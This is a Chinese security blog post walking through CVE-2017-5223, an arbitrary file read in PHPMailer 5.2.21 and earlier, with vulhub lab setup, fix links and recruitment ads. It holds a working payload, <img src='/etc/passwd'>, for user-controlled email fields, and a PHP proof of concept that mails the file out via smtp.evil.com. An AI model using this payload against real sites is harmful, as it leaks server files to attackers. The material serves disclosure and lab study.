\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/y7N3CD1683W2WX-naT5HCA)

_**声明**_

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测以及文章作者不为此承担任何责任。  
雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

_**No.1  
**_

_**漏洞原理**_

PHPMailer 在发送邮件的过程中，会在邮件内容中寻找图片标签（<img src="...">），并将其 src 属性的值提取出来作为附件。所以，如果我们能控制部分邮件内容，可以利用 < img src="/etc/passwd"> 将文件 / etc/passwd 作为附件读取出来，造成任意文件读取漏洞。

_**No.2  
**_

_**影响版本**_

PHPMailer <= 5.2.21

_**No.3  
**_

_**环境搭建**_

使用 vulhub 中的 CVE-2017-5223 环境进行搭建

启动 vulhub 环境：

git clone https://github.com/vulhub/vulhub.git

cd vulhub/phpmailer/CVE-2017-5223

在当前目录下创建文件. env，内容如下（将其中的配置值修改成你的 smtp 服务器、账户、密码）：

```
SMTP\_SERVER=smtp.163.com
SMTP\_PORT=25
SMTP\_EMAIL=your\_email@163.com
SMTP\_PASSWORD=授权码
SMTP\_SECURE=none
```

其中，SMTP\_SECURE 是 SMTP 加密方式，可以填写 none、ssl 或 tls。

docker-compose build  
docker-compose up -d  
环境启动后，访问 http://your-ip:8080/，即可看到一个 “意见反馈” 页面。

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWh6Z1Rgibc6dSiahXOricKXbKXnicJWVicq06E0zfn8km6xKH8DUUTricMNTHBdeGn20FRicBL2sGKbMEaw/640?wx_fmt=png)

该场景在实战中很常见，比如用户注册网站成功后，通常会收到一封包含自己昵称的通知邮件，那么，我们在昵称中插入恶意代码 <img src="/etc/passwd">，目标服务器上的文件将以附件的形式被读取出来。

同样，我们填写恶意代码在 “意见” 的位置：

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWh6Z1Rgibc6dSiahXOricKXbKRTJzTczoDhWT5TFtyXzcuL5E812shE0ViaczTPQYT9BJAQHPHiafyIdQ/640?wx_fmt=png)

收到邮件

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWh6Z1Rgibc6dSiahXOricKXbKn9BhPvaZ9GvOJWAkGtkfYTsicNvBacUUu7moPUKx28ZjENEjuCe3dgg/640?wx_fmt=png)

下载后打开

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWh6Z1Rgibc6dSiahXOricKXbKXxlA2tfKv0X2qOyffoyGyyYAFb8Oia9fjggZ4kr4wQCBTJgItuI0ibjg/640?wx_fmt=png)

_**No.4  
**_

_**漏洞 poc**_

  

```
<?php  
# Author:Yxlink
require\_once('PHPMailerAutoload.php');
$mail = new PHPMailer();
$mail->IsSMTP();
$mail->Host = "smtp.evil.com";
$mail->Port = 25;
$mail->SMTPAuth   = true;
 
$mail->CharSet  = "UTF-8";
$mail->Encoding = "base64";
 
$mail->Username = "test@evil.com";  
$mail->Password = "tes1234t";  
$mail->Subject = "hello";
 
$mail->From = "test@evil.com";  
$mail->FromName = "test";  
 
$address = "testtest@test.com";
$mail->AddAddress($address, "test");
 
$mail->AddAttachment('test.txt','test.txt');  //test.txt可控即可任意文件读取 
$mail->IsHTML(true);  
$msg="<img src='/etc/passwd'>test";//邮件内容形如这样写。
$mail->msgHTML($msg);
 
if(!$mail->Send()) {
  echo "Mailer Error: " . $mail->ErrorInfo;
} else {
  echo "Message sent!";
}
?>
```

_**No.5  
**_

_**漏洞修复**_

受影响的用户应当立即升级：

https://github.com/PHPMailer/PHPMailer

_**No.6  
**_

_**有关 PHPMailer 的安全声明**_

https://github.com/PHPMailer/PHPMailer/blob/master/SECURITY.md

_**招聘启事**_

安恒雷神众测 SRC 运营（实习生）  
————————  
【职责描述】  
1\.  负责 SRC 的微博、微信公众号等线上新媒体的运营工作，保持用户活跃度，提高站点访问量；  
2\.  负责白帽子提交漏洞的漏洞审核、Rank 评级、漏洞修复处理等相关沟通工作，促进审核人员与白帽子之间友好协作沟通；  
3\.  参与策划、组织和落实针对白帽子的线下活动，如沙龙、发布会、技术交流论坛等；  
4\.  积极参与雷神众测的品牌推广工作，协助技术人员输出优质的技术文章；  
5\.  积极参与公司媒体、行业内相关媒体及其他市场资源的工作沟通工作。  
【任职要求】   
 1.  责任心强，性格活泼，具备良好的人际交往能力；  
 2.  对网络安全感兴趣，对行业有基本了解；  
 3.  良好的文案写作能力和活动组织协调能力。

简历投递至

bountyteam@dbappsecurity.com.cn

设计师（实习生）

————————

【职位描述】  
负责设计公司日常宣传图片、软文等与设计相关工作，负责产品品牌设计。  
【职位要求】  
1、从事平面设计相关工作 1 年以上，熟悉印刷工艺；具有敏锐的观察力及审美能力，及优异的创意设计能力；有 VI 设计、广告设计、画册设计等专长；  
2、有良好的美术功底，审美能力和创意，色彩感强；精通 photoshop/illustrator/coreldrew / 等设计制作软件；  
3、有品牌传播、产品设计或新媒体视觉工作经历；  
【关于岗位的其他信息】  
企业名称：杭州安恒信息技术股份有限公司  
办公地点：杭州市滨江区安恒大厦 19 楼  
学历要求：本科及以上  
工作年限：1 年及以上，条件优秀者可放宽

简历投递至 

bountyteam@dbappsecurity.com.cn

安全招聘  
————————  
公司：安恒信息  
岗位：Web 安全 安全研究员  
部门：战略支援部  
薪资：13-30K  
工作年限：1 年 +  
工作地点：杭州（总部）、广州、成都、上海、北京

工作环境：一座大厦，健身场所，医师，帅哥，美女，高级食堂…  
【岗位职责】  
1\. 定期面向部门、全公司技术分享;  
2\. 前沿攻防技术研究、跟踪国内外安全领域的安全动态、漏洞披露并落地沉淀；  
3\. 负责完成部门渗透测试、红蓝对抗业务;  
4\. 负责自动化平台建设  
5\. 负责针对常见 WAF 产品规则进行测试并落地 bypass 方案  
【岗位要求】  
1\. 至少 1 年安全领域工作经验；  
2\. 熟悉 HTTP 协议相关技术  
3\. 拥有大型产品、CMS、厂商漏洞挖掘案例；  
4\. 熟练掌握 php、java、asp.net 代码审计基础（一种或多种）  
5\. 精通 Web Fuzz 模糊测试漏洞挖掘技术  
6\. 精通 OWASP TOP 10 安全漏洞原理并熟悉漏洞利用方法  
7\. 有过独立分析漏洞的经验，熟悉各种 Web 调试技巧  
8\. 熟悉常见编程语言中的至少一种（Asp.net、Python、php、java）  
【加分项】  
1\. 具备良好的英语文档阅读能力；  
2\. 曾参加过技术沙龙担任嘉宾进行技术分享；  
3\. 具有 CISSP、CISA、CSSLP、ISO27001、ITIL、PMP、COBIT、Security+、CISP、OSCP 等安全相关资质者；  
4\. 具有大型 SRC 漏洞提交经验、获得年度表彰、大型 CTF 夺得名次者；  
5\. 开发过安全相关的开源项目；  
6\. 具备良好的人际沟通、协调能力、分析和解决问题的能力者优先；  
7\. 个人技术博客；  
8\. 在优质社区投稿过文章；

岗位：安全红队武器自动化工程师  
薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1\. 负责红蓝对抗中的武器化落地与研究；  
2\. 平台化建设；  
3\. 安全研究落地。  
【岗位要求】  
1\. 熟练使用 Python、java、c/c++ 等至少一门语言作为主要开发语言；  
2\. 熟练使用 Django、flask 等常用 web 开发框架、以及熟练使用 mysql、mongoDB、redis 等数据存储方案；  
3: 熟悉域安全以及内网横向渗透、常见 web 等漏洞原理；  
4\. 对安全技术有浓厚的兴趣及热情，有主观研究和学习的动力；  
5\. 具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1\. 有高并发 tcp 服务、分布式等相关经验者优先；  
2\. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4\. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5\. 具备良好的英语文档阅读能力。

简历投递至 

bountyteam@dbappsecurity.com.cn

![](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JWh6Z1Rgibc6dSiahXOricKXbKahSSM1yeUCzRATvzPPPLhnsia6R4uEYG0PySGV4KlH9icuovGIMZzJYA/640?wx_fmt=jpeg)

专注渗透测试技术

全球最新网络攻击技术

END

![](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JVU5ibrMYA8O1ybRFf7t0fpM60Dg9LOYR1fTJ0TNDZbrlsia0tFhC0Wkg2420jR0yFm9HXFkia9LODJg/640?wx_fmt=jpeg)